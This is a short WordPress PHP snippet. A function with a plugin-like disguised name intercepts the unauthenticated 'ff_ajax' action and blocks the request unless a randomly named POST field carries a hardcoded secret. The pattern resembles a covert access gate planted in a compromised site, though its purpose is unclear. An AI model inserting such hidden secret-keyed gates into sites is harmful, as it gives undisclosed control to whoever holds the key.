<?php

function gamipress_yoast_stop() {
	if (!isset($_POST["flicfpkgxgl"]) || $_POST["flicfpkgxgl"] !== "uxupkXuyGRRq") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'gamipress_yoast_stop', 5, 1);
